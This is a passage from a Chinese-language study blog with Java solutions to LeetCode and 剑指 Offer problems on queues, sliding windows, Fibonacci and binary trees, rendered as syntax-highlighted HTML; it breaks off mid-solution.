<h3 id="剑指-Offer-59-II-队列的最大值"><a href="#剑指-Offer-59-II-队列的最大值" class="headerlink" title="剑指 Offer 59 - II. 队列的最大值"></a><a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/">剑指 Offer 59 - II. 队列的最大值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 队列可以看成是一个滑动窗口，入队就是将窗口的右边界右移，出队就是将窗口的左边界右移。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaxQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; queue;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; help;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MaxQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        help = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">max_value</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue.isEmpty() ? -<span class="number">1</span> : help.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        queue.offer(value);</span><br><span class="line">        <span class="keyword">while</span> (!help.isEmpty() &amp;&amp; value &gt; help.peekLast()) &#123;</span><br><span class="line">            help.pollLast();</span><br><span class="line">        &#125;</span><br><span class="line">        help.offer(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop_front</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (val == help.peek()) &#123;</span><br><span class="line">            help.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-10-I-斐波那契数列"><a href="#剑指-Offer-10-I-斐波那契数列" class="headerlink" title="剑指 Offer 10- I. 斐波那契数列"></a><a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/">剑指 Offer 10- I. 斐波那契数列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">1</span>, r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            r = (p + q) % <span class="number">1000000007</span>;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-57-II-和为s的连续正数序列"><a href="#剑指-Offer-57-II-和为s的连续正数序列" class="headerlink" title="剑指 Offer 57 - II. 和为s的连续正数序列"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/">剑指 Offer 57 - II. 和为s的连续正数序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] findContinuousSequence(<span class="type">int</span> target) &#123;</span><br><span class="line">        ArrayList&lt;<span class="type">int</span>[]&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">1</span>; r &lt; target; r++) &#123;</span><br><span class="line">            sum += r;</span><br><span class="line">            <span class="keyword">while</span> (sum &gt; target) &#123;</span><br><span class="line">                sum -= l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[r - l + <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                    tmp[i] = l + i;</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[list.size()][];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            res[i] = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="209-长度最小的子数组-x2F"><a href="#209-长度最小的子数组-x2F" class="headerlink" title=" 209. 长度最小的子数组&#x2F;"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum"> 209. 长度最小的子数组</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, min = nums.length + <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (r &lt; nums.length) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (r &lt; nums.length &amp;&amp; sum &lt; target ) &#123;</span><br><span class="line">                sum += nums[r];</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= target) &#123;</span><br><span class="line">                min = Math.min(min, r  - l);</span><br><span class="line">                sum -= nums[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == nums.length + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="671-二叉树中第二小的节点"><a href="#671-二叉树中第二小的节点" class="headerlink" title="671. 二叉树中第二小的节点"></a><a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/">671. 二叉树中第二小的节点</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="comment">// 递归找到比根结点大的值时可以立即返回.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> find(root, root.val);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">private</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (root.val &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.val;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> find(root.left, val);</span><br><span class="line">      <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> find(root.right, val);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(l &gt; val &amp;&amp; r &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.min(l, r);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> Math.max(l, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 后序遍历dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == p || root == q) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235. 二叉搜索树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        lca(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lca</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((root.val - p.val) * (root.val - q.val) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            res = root;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            lca(root.right, p, q);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lca(root.left, p, q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="230-二叉搜索树中第K小的元素"><a href="#230-二叉搜索树中第K小的元素" class="headerlink" title="230. 二叉搜索树中第K小的元素"></a><a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/">230. 二叉搜索树中第K小的元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">			ArrayList&lt;Integer&gt; nums = inorder(root, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">      <span class="keyword">return</span> nums.get(k-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	</span><br><span class="line">  	<span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">inorder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; arr)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> arr;</span><br><span class="line">      inorder(root.left, arr);</span><br><span class="line">      arr.add(root.val);</span><br><span class="line">      inorder(root.right, arr);</span><br><span class="line">      <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 迭代</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">          <span class="keyword">while</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">              stack.push(root);</span><br><span class="line">              root = root.left;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          root = stack.pop();</span><br><span class="line">          k = k - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> (k == <span class="number">0</span>) <span class="keyword">return</span> root.val;</span><br><span class="line">          root = root.right;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124. 二叉树中的最大路径和"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. 二叉树中的最大路径和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置一个全局变量res记录最大路径和</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       myMaxPathSum(root);</span><br><span class="line">       <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">myMaxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> myMaxPathSum(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> myMaxPathSum(root.right);</span><br><span class="line">        <span class="keyword">if</span> (left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            left = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            right = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = Math.max(max, left + root.val + right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(root.val + left, root.val + right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序为升序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">pre</span> <span class="operator">=</span> Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!isValidBST(root.left)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= pre) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        pre = root.val;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="130-被围绕的区域"><a href="#130-被围绕的区域" class="headerlink" title="130. 被围绕的区域"></a><a href="https://leetcode-cn.com/problems/surrounded-regions/">130. 被围绕的区域</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这时候的 O 是不做替换的。因为和边界是连通的。为了记录这种状态，我们把这种情况下的 O 换成 # 作为占位符，待搜索结束之后，遇到O 替换为 X（和边界不连通的O）；遇到 #，替换回 O(和边界连通的O)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || j &lt; <span class="number">0</span> || i &gt;= board.length || j &gt;= board[<span class="number">0</span>].length || board[i][j] == <span class="string">&#x27;X&#x27;</span> || board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        dfs(board, i - <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i + <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i, j - <span class="number">1</span>);</span><br><span class="line">        dfs(board, i, j + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非递归的方式，我们需要记录每一次遍历过的位置，我们用 stack 来记录，因为它先进后出的特点。</span></span><br><span class="line"><span class="comment">// 而位置我们定义一个内部类 Pos 来标记横坐标和纵坐标。</span></span><br><span class="line"><span class="comment">// 注意的是，在写非递归的时候，我们每次查看 stack 顶，但是并不出 stack，直到这个位置上下左右都搜索不到的时候出 Stack。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pos</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        Pos(<span class="type">int</span> i, <span class="type">int</span> j) &#123;</span><br><span class="line">            <span class="built_in">this</span>.i = i;</span><br><span class="line">            <span class="built_in">this</span>.j = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        Stack&lt;Pos&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(i, j));</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Pos</span> <span class="variable">current</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span> (current.i - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i - <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i - <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i - <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.i + <span class="number">1</span> &lt; board.length &amp;&amp; board[current.i + <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i + <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i + <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i][current.j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j - <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j + <span class="number">1</span> &lt;  board[<span class="number">0</span>].length &amp;&amp; board[current.i][current.j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j + <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j + <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96. 不同的二叉搜索树"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees/">96. 不同的二叉搜索树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++) 